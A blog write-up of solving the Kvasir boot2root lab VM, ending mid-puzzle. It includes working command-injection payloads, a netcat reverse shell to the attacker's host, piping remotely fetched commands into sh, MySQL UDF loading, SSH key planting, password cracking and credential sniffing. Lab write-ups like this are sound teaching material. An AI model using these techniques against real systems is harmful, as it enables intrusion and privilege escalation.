---
categories:
- CTF
- Vulnerable VM
- Solution
- Challenge
- VulnHub
comments: true
date: 2014-11-09T10:27:09Z
title: solving kvasir - netcat edition
url: /2014/11/09/solving-kvasir-netcat-edition/
---

##introduction
[Kvasir](http://vulnhub.com/entry/kvasir-i,106/), a boot2root by [@_RastaMouse](https://twitter.com/_RastaMouse) has to be one of my most favorite boot2roots to date, if not the most favorite. Favorite however does not mean it was easy. It also proved to be one of the most challenging ones I have had the chance to try!

{% img right https://i.imgur.com/gHw2Q50.gif %} Kvasir is *extremely* well polished, and it can be seen throughout the VM that [@_RastaMouse](https://twitter.com/_RastaMouse) has gone through a lot of effort to make every challenge as rewarding as possible. From exploiting simple web based vulnerabilities to service misconfigurations, traffic sniffing, steganography, forensics and cryptopraphy, Kvasir has it all! Solving it also had me make really heavy use of good old netcat.

This writeup details the path I took to read the final flag :)

<!--more-->

##a usual start
Before we start off though, I feel its important to touch base on tunneling techniques used. All of the tunneling was done either via netcat, or via a SSH socks proxy. The socks proxies were accessed using `proxychains`, and I was editing `/etc/proxychains.conf` to match the port of the proxy I needed to use to reach my desired destination.

With that out the way, lets start.  
Almost all of the boot2roots have a discovery phase. After downloading the archive from [vulnhub.com](http://vulnhub.com), I ran a ping scan in the subnet that my host-only network lives in. It returned with no results, and I realized there may already be more to this than anticipated. I engaged *lazy mode*™ and checked what the VirtualBox session showed the IP was:

{% img https://i.imgur.com/ZTj0D3h.png %}

**192.168.56.102**. Sweet, throwing `nmap` at it showed only `tcp/80` as open.

```bash
root@kali:~# nmap 192.168.56.102

Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 11:07 SAST
Nmap scan report for 192.168.56.102
Host is up (0.000061s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:CF:5D:57 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
```

##fink ur gud enuf?
Browsing to the IP using Iceweasel, we see a login portal presented to us:

{% img https://i.imgur.com/vUSSRt7.png %}

I made a few attempts at guessing a login, and eventually just threw a `'` at the username field:

{% img https://i.imgur.com/gVb0iK7.png %}

I had a instant troll alert and figured it can't be *that* easy!? Changing the username payload from `'` to `' OR 1=1 LIMIT 1--` with a random word as a password, resulted in the application returning a `403` type response. I figured that something strange was going on here, and fired up [Burp Suite](http://portswigger.net/burp/) to have a look under the hood at what is happening. As seen in the web browser, the web server really does respond with a HTTP 403:

{% img https://i.imgur.com/mAxhkaG.png %}

Moving on to the register page. Registration required a username and password, as well as a date of birth. I registered `bob:bob` with a DoB of `09/09/09`, and attempted to login with the credentials:

{% img https://i.imgur.com/o9Utreq.png %}

Not a very useful web application so far, but nonetheless, I figured there is something I am not seeing yet. I went back to the registration page and attempted some SQLi payloads there. The form definitely seemed vulnerable to SQLi, and I managed to uncover a part of the backend query as `'a', 'a', 0, NULL)`. Considering this was a new account registration page, my guess was that this was part of a `INSERT` query:

{% img https://i.imgur.com/DA1Xe5H.png %}

It was about at this time where that thing called real life started to interfere and drive my attention away from Kvasir. While working, I decided to run trusty 'ol `wfuzz` on the web service to see if there was anything interesting to reveal:

```bash
root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc 404 http://192.168.56.102/FUZZ.php

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.56.102/FUZZ.php
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt

Total requests: 1660
==================================================================
ID  Response   Lines      Word         Chars          Request    
==================================================================

00077:  C=302     16 L        34 W      365 Ch    " - admin"
00302:  C=403     10 L        30 W      294 Ch    " - cgi-bin/"
00394:  C=403     10 L        30 W      292 Ch    " - create"
00455:  C=403     10 L        30 W      294 Ch    " - descarga"
00457:  C=403     10 L        30 W      296 Ch    " - descarrega"
00463:  C=403     10 L        30 W      298 Ch    " - descarregues"
00741:  C=200     20 L        44 W      464 Ch    " - index"
00894:  C=403     10 L        30 W      290 Ch    " - load"
00901:  C=302      0 L         0 W        0 Ch    " - login"
00904:  C=302      0 L         0 W        0 Ch    " - logout"
00964:  C=302     15 L        16 W      168 Ch    " - member"
01247:  C=200     17 L        39 W      426 Ch    " - register"
01331:  C=403     10 L        30 W      292 Ch    " - select"
01432:  C=200      0 L         0 W        0 Ch    " - submit"
01556:  C=403     10 L        30 W      292 Ch    " - update"
01565:  C=403     10 L        30 W      293 Ch    " - updates"
```

Woa, thats quite a bit of results to work through eh :)

##admins only want to 302 here
Of everything `wfuzz` revealed to us, `admin.php` was the most interesting one. Watching Burp as the requests went up and down, I noticed that `admin.php` would return a HTTP 302 code with a location, along with an actual body:

{% img https://i.imgur.com/exdmq5A.png %}

Sweet! I modified the response in Burp to return `200` instead, and removed the `Location:` header. We now had a new page to work with :)

{% img https://i.imgur.com/6WoT1x2.png %}

The form hints that we can check the service status of daemons running on the underlying OS, and suggests `apache2` as input. I submitted the form with `apache2` as the service, and got back a response (that also tried to 302 but I fixed that :D) with a new section `Apache2 is running (pid 1330).`. This just **screams** command injection doesn’t it?

##command injection
In order for me to fuzz this further, I took the request to trusty 'ol `curl`. While doing this, I realized that `admin.php` did no checks to ensure that we are authenticated or anything. We could simply submit `service=<payload>` as a POST to `admin.php` and get output:

```bash
root@kali:~# curl 'http://192.168.56.102/admin.php' --data 'service=apache2;'

<html>
<body>
<div align="center">

<h1>Service Check</h1>

<form name="service" method="post" action="">
<input name="service" id="service" type="text" placeholder="apache2" /><br /><br />
<input name="submit" id="submit" type="submit" value="Submit" />
</form>

<form action="logout.php" method="post">
<input type="submit" value="Logout" />
</form>

<pre>Usage: /etc/init.d/apache2 {start|stop|graceful-stop|restart|reload|force-reload|start-htcacheclean|stop-htcacheclean|status}.
</pre>
```

Entering `apache2;` as the input, revealed the first step in our command injection. With `apache2;` as the payload, I figured that the php script was taking our user input and running with the following pseudo code:

```php
<?php

print system("/etc/init.d/" . $_POST["service"] . " status");
```

So, with our payload, we have modified this to run `/etc/init.d/apache2; status`, which will fail for obvious reasons! A little more fiddling finally got me to a working payload by posting `service=` as `;echo 'id';` where the single quotes are actually back ticks. (octopress grrr)

```bash
root@kali:~# curl 'http://192.168.56.102/admin.php' --data 'service=;echo `id`;'

[... snip ...]

<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

##netcat is our entry into the rabbit hole
With the command injection now exploitable, I grabbed some skeleton code that I normally use to try and make these types of command execution vulnerabilities slightly easier to work with. The basic premise is to have the command executed, and the response regex'd out. This ended up as the following python script:

```python
#!/usr/bin/python

# Kvasir Command Execution

# $ python cmd.py "uname -a"
# Command to run: uname -a
# 
# Linux web 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64 GNU/Linux

import requests
import re
import sys
import os
import binascii

print 'Command to run: %s' % sys.argv[1]

# generate 2 random strings so that we can regex out the command output
command_start = binascii.b2a_hex(os.urandom(30))
command_end = binascii.b2a_hex(os.urandom(30))

# prepare something that we can regex out
params = {'service' : ';echo %s; echo `%s`; echo %s;' % (command_start, sys.argv[1], command_end) }

#fetch, ignoring the troll redirect
r = requests.post('http://192.168.56.102/admin.php', params, allow_redirects=False)

#match regex and print
print  re.findall(r'%s([^|]+)%s' % (command_start, command_end), r.text)[0].replace('\n%s\n' % command_end,'')
```

So, now I can just run `python cmd.py "id"` and get the output (the *(kvasir)* in front of my prompt is my python virtualenv where I installed the `requests` dependency):

```bash
(kvasir)root@kali:~# python cmd.py "id"
Command to run: id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

And so, initial enumeration was done. Immediately I noticed that this host had 2 network interfaces. **192.168.1.100** and **192.168.2.100**. No sign of **192.168.56.102** here... It also seemed like I would be able to build a netcat shell out of this environment to my attacking host, so I set up a listener with `nc -lvp 4444`, and connected to it using my `cmd.py` script `python cmd.py "/bin/nc 192.168.56.101 4444 -e /bin/bash"`:

```bash
root@kali:~# nc -lvp 4444 
listening on [any] 4444 ...
192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 53516
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

So, in order to make sure we don't lose our place, consider the following simple diagram showing the network paths for gaining first shell access to the host `web`:

{% img https://i.imgur.com/Q2rSi2G.png %}

The only public presence of the internal network is therefore the originally discovered **192.168.56.102** IP address.

##my-see-qual as root deserves a slap on the wrist
With semi interactive shell access using `netcat` to **web** (192.168.1.100), some more enumeration was done. Most importantly, the sources serving the web site that I have exploited to gain a command shell revealed credentials and a host of a MySQL instance. Consider the following extract from `member.php`:

```php
<?php

session_start();

if (!isset($_SESSION["member"])) {
    header("Location: index.php");
}

$user = $_SESSION["username"];

mysql_connect("192.168.2.200", "webapp", "webapp") or die(mysql_error());
mysql_select_db("webapp") or die(mysql_error());

$query = "SELECT dob FROM users WHERE username='$user'";
$result = mysql_query($query) or die(mysql_error());

?>
[... snip ...]
```

So mysql access with `webapp:webapp` at 192.168.2.200. Lets test this and check out the server. I executed commands using mysql -e on the netcat shell that just spawned:

```bash
mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'show grants;'
Grants for webapp@192.168.2.100
GRANT SELECT, INSERT ON *.* TO 'webapp'@'192.168.2.100' IDENTIFIED BY PASSWORD '*BF7C27E734F86F28A9386E9759D238AFB863BDE3'
GRANT ALL PRIVILEGES ON `webapp`.* TO 'webapp'@'192.168.2.100'
```

So I can select anywhere. Nice :)

```bash
mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use webapp; show tables;'
Tables_in_webapp
todo
users
mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use webapp; select * from todo;'
task
stop running mysql as root
```

A table called `todo` exists, with a string `stop running mysql as root`. That was the first hint and immediately had me thinking about [MySQL UDF](http://www.mysqludf.org/)'s, one which could allow us to run system commands. However, in order to get a UDF loaded, I will need a dba level account, one which I don't have yet. From the previous grants output, I can see that I am allowed to query any table on the database server, so lets get some administrative hashes:

```bash
mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use mysql; select DISTINCT User,Password from user;'
User    Password
root    *ECB01D78C2FBEE997EDA584C647183FD99C115FD
debian-sys-maint    *E0E0871376896664A590151D348CCE9AA800435B
webapp  *BF7C27E734F86F28A9386E9759D238AFB863BDE3
```

As a side note, further enumeration of the PHP sources and MySQL table `users` showed that if we injected SQL on the registration page to add a extra `1`, we would be considered an admin, and would have also seen the admin page that is vulnerable to the already found command injection.

###cracking root's MySQL password
Now that I had the password hash for the root user, I proceeded to try and crack it. For this I used `hashcat` with the ever famous `rockyou` wordlist:

```bash
# first, echo the hash to a file
root@kali:~# echo "ECB01D78C2FBEE997EDA584C647183FD99C115FD" > db.root

# next, we tell hash cat the type of hash we have and wait a few seconds :)
root@kali:~# hashcat -m 300 db.root /usr/share/wordlists/rockyou.txt 
This copy of hashcat will expire on 01.01.2015. Please upgrade to continue using hashcat.

Initializing hashcat v0.47 by atom with 8 threads and 32mb segment-size...

Added hashes from file db.root: 1 (1 salts)
Activating quick-digest mode for single-hash

NOTE: press enter for status-screen

ecb01d78c2fbee997eda584c647183fd99c115fd:coolwater

All hashes have been recovered

Input.Mode: Dict (/usr/share/wordlists/rockyou.txt)
Index.....: 1/5 (segment), 3627099 (words), 33550339 (bytes)
Recovered.: 1/1 hashes, 1/1 salts
Speed/sec.: - plains, 3.27M words
Progress..: 281260/3627099 (7.75%)
Running...: --:--:--:--
Estimated.: 00:00:00:01

Started: Sun Nov  9 14:07:14 2014
Stopped: Sun Nov  9 14:07:14 2014
```

The password for the MySQL `root` user is therefore `coolwater`:

```bash
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'show grants;'
Grants for root@192.168.2.100
GRANT ALL PRIVILEGES ON *.* TO 'root'@'192.168.2.100' IDENTIFIED BY PASSWORD '*ECB01D78C2FBEE997EDA584C647183FD99C115FD' WITH GRANT OPTION
```

###loading the UDF remotely
With a full dba level account, it was time to get the UDF loaded. My initial approach for this failed pretty badly to start off with.

I grabbed a copy of a `do_system()` UDF that I have previously used successfully from [here](http://www.0xdeadbeef.info/exploits/raptor_udf.c), called `raptor_udf.c`. Considering the host operating system was 64bit, and my attacking machine was 32bit, I opted to compile the UDF on the `web` host. Compilation was done on the `web` host with:

```bash
gcc -g -c raptor_udf.c -fPIC
gcc -g -shared -Wl,--soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
```

This resulted in a raptor_udf.so file, which was ready to be uploaded to the server. Now, the word `uploading` sounds trivial, however its not. I need to know *where* to first. For this, I enumerate the MySQL `plugin_dir`:

```bash
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'select @@plugin_dir;'
@@plugin_dir
/usr/lib/mysql/plugin/
```

So this means I need to write the udf to `/usr/lib/mysql/plugin/raptor_udf.so`. Fair enough. But how do I write this? Well there are many approaches to this. One is to use ` --local-infile=1` as a flag on the local mysqlclient (needs to be allowed server side too), to actually upload the **local** file to wherever (a table in our case) and then to a file via `INTO DUMPFILE`. The other option is to simply convert the content to hex, and run `SELECT 0x` + `<CONTENT AS HEX>` + `INTO DUMPFILE /usr/lib/mysql/plugin/raptor_udf.so`.

I opted for the content encoding as hex and generated a `xxd` output of the compiled `raptor_udf.so`. With this uploaded, I came to the section where the function was to be created, and this is where I got stuck. I would simply get a error along the likes of `Undefined Symbol "do_system" in raptor_udf.so`. :\

Eventually, I opted to find a precompiled 64bit `.so` to upload, and found one in the [sqlmap repository]( https://github.com/sqlmapproject/sqlmap/blob/master/udf/mysql/linux/64/lib_mysqludf_sys.so). I downloaded this and converted it to hex using `xxd`. I then created the following file with the mysql commands to run on the `web` host from my attacking machine:

```bash
root@kali:~# cat load_udf.sh
touch log
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'use mysql; select 0x7f454

    [... snip ... but the this the output of xxd -p lib_mysqludf_sys.so ]

0000000000000 into dumpfile "/usr/lib/mysql/plugin/raptor_udf.so";' 2>> log
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'create function sys_exec returns integer soname "raptor_udf.so";' 2>> log
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'use mysql; select * from mysql.func;' 2>> log

# this adds me a SSH key to roots authorized keys using the command execution udf we have prepared
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'select sys_exec("echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W8Vu9F68nqmIYyk3hBlydwbOkevh/HfsNm50pd7ZZPK/mpAdZxYYxfBcvUQcWmgtw49ihTAJGh5KZJM/pL4xCw/meavFXy01SX7TZNAmrxcn6FDcXQJ6DC+TUMWXigxcCwntKxSHChyTiDB\" > /root/.ssh/authorized_keys")' 2>> log
```

With this file ready, I opened a netcat port to pipe it to, and read it on `web`:

```bash
# on the attacking machine, I opened netcat with my mysql commands
root@kali:~# nc -lvp 4444 < load_udf.sh 
listening on [any] 4444 ...

# then on the original netcat shell I have, read it
timeout 3 nc 192.168.56.101 4444 | sh
name    ret dl  type
sys_exec    2   raptor_udf.so   function
sys_exec("echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W
0
```

The public ssh key is sourced from a new key pair I generated for Kvasir. So, with that run we get a exit code of `0`, indicating that it was successful. I specify the `timeout` command so that the nc session opened from within another nc session will exit and we don’t lose the shell. Pressing ^C will kill the whole session and not just the netcat I just run :)

##ssh to db host
With all that done, I have my public key for the `root` user added, and I should be able to ssh to it. There is one interesting hurdle though, how do I *get* to 192.168.2.200's port 22? :)

For that, I decided to look at `netcat` port forwarding! But first, lets read some man pages: 

```bash
#from nc(1)
OPTIONS
       -c string    specify shell commands to exec after connect (use with caution).
```

*"use with caution"*. I like it already. Ok so I can open a netcat listener, which will open another one on connect listening on a new port. We can then connect to this listener, opening another connection to the ssh server we want to connect to, effectively forwarding the port. Clear as mud!

{% img https://i.imgur.com/7IggbMC.jpg %}

Lets see this in action. First I setup the initial listener on the attacking machine:

```bash
# listen on tcp/4444, re-listening on tcp/222 on a new connection
root@kali:~# nc -lvp 4444 -c "nc -lvp 222"
listening on [any] 4444 ...
```

With the listener setup, lets issue a new `nc` command in the initial shell that I got on `web`, connecting the dots:

```bash
nc 192.168.56.101 4444 -c "nc 192.168.2.200 22"
```

When this runs, the initial listener will see the new connection, and I should have the `tcp/22` of **192.168.2.200** now forwarded locally:

```bash
root@kali:~# nc -lvp 4444 -c "nc -lvp 222"
listening on [any] 4444 ...

# connection comes in from 192.168.1.100
192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 53870
listening on [any] 222 ...
```

Lets take a look at a updated network diagram, detailing where I am in the network now. The new port forward is denoted in red:

{% img https://i.imgur.com/A2463Kc.png %}

Lets try and SSH in with the key pair that I generated and loaded using the MySQL UDF:

```bash
root@kali:~# ssh -D 8000 root@127.0.0.1 -p222 -i kvasir_key
Linux db 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  9 07:13:17 2014 from 192.168.2.100
root@db:~# 
```

I added the `-D` option so that I may have a socks proxy to work with should any further tunneling be required. This means now that with the SSH session built, I have a *almost* *direct* connection to the `db` (192.168.2.200) host, as denoted in green below:

{% img https://i.imgur.com/wHNJJ5g.png %}

8-)

##not exactly nsa level spying but heh
Initial enumeration revealed that this host (`db`) had 2 network interfaces. One with IP **192.168.2.200** (the one I came in from), and another with IP **192.168.3.200**. There were also 2 entries in `/etc/hosts` about 2 hosts in the 3.x network:

```bash
root@db:~# cat /etc/hosts
# 192.168.3.40  celes
# 192.168.3.50  terra

[... snip ...]
```

The host was also running a mysql server (the one we pwnd), and a pure-ftpd server:

```bash
root@db:~# ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 Nov08 ?        00:00:00 init [3]  
root      1242     1  0 Nov08 ?        00:00:00 dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root      1408     1  0 Nov08 ?        00:00:00 /usr/sbin/sshd
root      1434     1  0 Nov08 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
root      1761  1434  0 Nov08 ?        00:00:37 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --pid-file=/var/run/mysqld/mysqld
root      1762  1434  0 Nov08 ?        00:00:00 logger -t mysqld -p daemon.error
root      1861     1  0 Nov08 ?        00:00:00 pure-ftpd (SERVER) 
[... snip ...]
```

A interesting file was in `/root/.words.txt`, which contained some random words, some of which i recognized as nicks in #vulnhub on freenode.

```bash
root@db:~# head /root/.words.txt 
borne
precombatting
noncandescent
cushat
lushness
precensure
romishness
nonderivable
overqualification
superkojiman
```

And finally, a troll flag :D

```bash
root@db:~# cat /root/flag 
This is not the flag you're looking for... :p
```

This was the first time I was really stuck on Kvasir. After quite a bit of poking around, I noticed a user `celes` in `/etc/pure-ftpd/pureftpd.passwd`, with a password that I was not able to crack. The host itself did not have this user configured either. I was starting to think that this server has nothing really to offer in the form of post exploitation and started planning exploration of neighboring hosts and their network services.

At one stage, I was checking to see what network activity was present on the interfaces, of which `eth0` had my SSH session, and `eth1` was quiet. At least, until I was about to close the tcpdump I had this sudden burst of packets:

```bash
root@db:~# tcpdump -i eth1
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
13:19:01.355970 IP 192.168.3.40.36425 > 192.168.3.200.ftp: Flags [S], seq 2471029534, win 14600, options [mss 1460,sackOK,TS val 13092832 ecr 0,nop,wscale 5], length 0
13:19:01.355988 IP 192.168.3.200.ftp > 192.168.3.40.36425: Flags [S.], seq 2507516314, ack 2471029535, win 14480, options [mss 1460,sackOK,TS val ack 535, win 490, options [nop,nop,TS val 13092837 ecr 13092836], length 0

[... snip ...]

13:19:01.378604 IP 192.168.3.200.ftp > 192.168.3.40.36425: Flags [P.], seq 535:548, ack 53, win 453, options [nop,nop,TS val 13092837 ecr 13092837], length 13
13:19:01.378631 IP 192.168.3.40.36425 > 192.168.3.200.ftp: Flags [R], seq 2471029587, win 0, length 0
^C
29 packets captured
29 packets received by filter
0 packets dropped by kernel
```

I changed the command to add the `-X` flag as this looked like FTP traffic flowing over the interface (you haven't forgotten the ftp server yet have you?). 

```bash
13:25:01.387981 IP 192.168.3.200.ftp > 192.168.3.40.36437: Flags [P.], seq 321:359, ack 13, win 453, options [nop,nop,TS val 13182840 ecr 13182839], length 38
    0x0000:  4510 005a 7e22 4000 4006 342b c0a8 03c8  E..Z~"@.@.4+....
    0x0010:  c0a8 0328 0015 8e55 1bf0 5a96 015a 5499  ...(...U..Z..ZT.
    0x0020:  8018 01c5 42a1 0000 0101 080a 00c9 2778  ....B.........'x
    0x0030:  00c9 2777 3333 3120 5573 6572 2063 656c  ..'w331.User.cel
    0x0040:  6573 204f 4b2e 2050 6173 7377 6f72 6420  es.OK..Password.
    0x0050:  7265 7175 6972 6564 0d0a                 required..

13:25:01.388050 IP 192.168.3.40.36437 > 192.168.3.200.ftp: Flags [P.], seq 13:32, ack 359, win 490, options [nop,nop,TS val 13182840 ecr 13182840], length 19
    0x0000:  4500 0047 73fe 4000 4006 3e72 c0a8 0328  E..Gs.@.@.>r...(
    0x0010:  c0a8 03c8 8e55 0015 015a 5499 1bf0 5abc  .....U...ZT...Z.
    0x0020:  8018 01ea a5ae 0000 0101 080a 00c9 2778  ..............'x
    0x0030:  00c9 2778 5041 5353 2069 6d32 3242 4634  ..'xPASS.im22BF4
    0x0040:  4858 6e30 310d 0a                        HXn01..

```

A cleartext username and password? Well aint that just handy! :D Just to confirm I wrote a pcap to disk with the `-W` flag, transferred it to my attacking machine and opened it in Wireshark so that I can inspect the whole FTP conversation.

{% img https://i.imgur.com/YiwWzsy.png %}

It seems like `celes` is simply logging in, getting a directory listing, and logging out.

Taking a long shot, I wondered if the age old problem of password reuse is applicable here, so I tried to ssh in to **192.168.3.40** (the ip the FTP conversation was coming from) using `celes:im22BF4HXn01`:

```bash
root@db:~# ssh celes@192.168.3.40
celes@192.168.3.40's password: # entered im22BF4HXn01
Linux dev1 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Thu Sep  4 09:20:00 2014
celes@dev1:~$
```

##finding terras secret
Ok lets take a moment and make sure I know where I am in the network. The newly accessed server is denoted in red:

{% img https://i.imgur.com/nXpoEBM.png %}

I don’t have connectivity directly to **192.168.3.40** at the moment, but if I really need that I can arrange it. For now, lets see what we have on `dev1`.

First, I find the sneaky ftp session script `getLogs.py`, that does exactly that which I saw in the packet captures. Next, I find a message in `celes` mailbox:

```bash
celes@dev1:~$ cat /var/spool/mail/celes 
Return-path: <celes@localhost>
Received: from celes by localhost with local (Exim 4.80)
    (envelope-from <celes@localhost>)
    id 1XHczw-0000V2-8y
    for celes@127.0.0.1; Wed, 13 Aug 2014 19:10:08 +0100
Date: Wed, 13 Aug 2014 19:10:08 +0100
To: celes@127.0.0.1
Subject: Reminder
User-Agent: Heirloom mailx 12.5 6/20/10
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-Id: <E1XHczw-0000V2-8y@localhost>
From: celes@localhost

Terra sent me kvasir.png and challenged me to solve the stupid little puzzle she has running on her machine... *sigh*
```

The message reveals that Terra has a puzzle on her machine (**192.168.3.50** from `/etc/hosts` on the `db` server?). She also mentions `kvasir.png`, which happens to be in `celese` home directory:

```bash
celes@dev1:~$ ls -lah kvasir.png 
-rw-r--r-- 1 celes celes 103K Sep  3 22:16 kvasir.png
```

Lastly, the `.bash_history` for `celese` has a entry `stepic --help`. `stepic` is a steganography tool. So, it seemed pretty clear what needs to be done here. My guess was that kvasir.png has a piece of the puzzle that is on Terra's machine. So, I converted the `kvasir.png` image to hex, and copy pasted the output on my attacking machine into a text file and converted it back to a image using `xxd -r -p kvasir.png.xxd > kvasir.png`.

{% img https://i.imgur.com/DKIbriL.png %}

###getting stepic to play nice
With the image ready, I searched for `stepic` using `pip` in my virtual env and installed it:

```bash
(kvasir)root@kali:~# pip install stepic
Downloading/unpacking stepic
  Downloading stepic-0.4%7ebzr.tar.gz
  Running setup.py egg_info for package stepic
    
Installing collected packages: stepic
  Running setup.py install for stepic
    changing mode of build/scripts-2.7/stepic from 644 to 755
    
    changing mode of /root/kvasir/bin/stepic to 755
Successfully installed stepic
Cleaning up...
```

However, `stepic` was not just a case of plug and play for me. **NOPE**:

```bash
(kvasir)root@kali:~# stepic 
Traceback (most recent call last):
  File "/root/kvasir/bin/stepic", line 24, in <module>
    import Image
ImportError: No module named Image
```

Long story short, a small hack and installation of another dependency finally got it working for me:

```bash
(kvasir)root@kali:~# pip install pillow
Downloading/unpacking pillow
  Downloading Pillow-2.6.1.tar.gz (7.3Mb): 7.3Mb downloaded
  Running setup.py egg_info for package pillow
    Single threaded build, not installing mp_compile: 1 processes

[... snip ...]

    *** OPENJPEG (JPEG2000) support not available
    --- ZLIB (PNG/ZIP) support available

[... snip ...]

Successfully installed pillow
Cleaning up...
```

The final hack was to change the installed `stepic` bin at `/root/kvasir/bin/stepic` line 24 from `import Image` to `from PIL import Image`. Finally, `stepic` was working fine.

###finding the secret
With `stepic` up and running, I was finally able to run it against the image `kvasir.png`:

```bash
(kvasir)root@kali:~# stepic --decode --image-in=kvasir.png --out=out

# check the file type we got out
root@kali:~# file out
out: ASCII text, with very long lines, with no line terminators

# check the output we got
root@kali:~# cat out
89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5
445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec90544
22304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be
559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e
7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e
215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae5
55e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d
97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88
df9bb4ae0a3dc20000000049454e44ae426082
```

At this stage I was pretty convinced my hacks to get `stepic` to work failed. I am also not really sure what to expect as output so that made it even harder to know if I had something to work with there.

Close study of the output string though got me started in trying to determine what this was that I had. My method involved me invoking a python shell and trying a bunch of `decode()` methods on it. I just took the first few characters of the output to play with as some decodings need specific string lengths etc:

```bash
root@kali:~# python
Python 2.7.3 (default, Mar 14 2014, 11:57:14) 
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> "89504e470d0a1a0a000000".decode("hex")
'\x89PNG\r\n\x1a\n\x00\x00\x00'
>>>
```

Decoding it as `hex` revealed the part I needed to see... `PNG`! So this string was a hex encoded PNG image (unless thats a troll too...). I took `out` and reversed it using `xxd -r -p`:

```bash
root@kali:~# xxd -p -r out > kvasir2.png 
root@kali:~# file kvasir2.png 
kvasir2.png: PNG image data, 290 x 290, 1-bit colormap, non-interlaced
```

Lets see what the image looks like:

{% img https://i.imgur.com/r0wxCYh.png %}

A QR code! I fetched my phone and scanned it, revealing the string `Nk9yY31hva8q`. Great!... I think. Wait, what does this even mean? I got stumped again into wondering what this arb string is for that I have. It was not the root password for `dev1` either.

##playing Terra's game
Without being able to place the string found in the QR code, I stepped one step back and decided to check out Terra's game as per the email. From the `/etc/hosts` on `db`, I saw a comment for `terra` as **192.168.3.50**. Using the SSH socks proxy on `tcp/8000` I setup when I setup the SSH session to **192.168.2.200**, I nmapped **192.168.3.50**.

```bash
# /etc/proxychains.conf has line
# socks5    127.0.0.1 8000

# scans will appear to be coming from 192.168.3.200 for
# 192.168.3.50
root@kali:~# proxychains nmap -sT 192.168.3.50
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 16:31 SAST
Nmap scan report for 192.168.3.50
Host is up (0.0012s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
4444/tcp open  krb524

Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
```

Well `tcp/4444` looks interesting! Lets have a look!

```bash
root@kali:~# proxychains nc 192.168.3.50 4444
ProxyChains-3.1 (http://proxychains.sf.net)
Hello Celes & Welcome to the Jumble!

Solve:indrssoses 
Solve:roneb bob
Solve:abaerrbs 

[... snip ...]

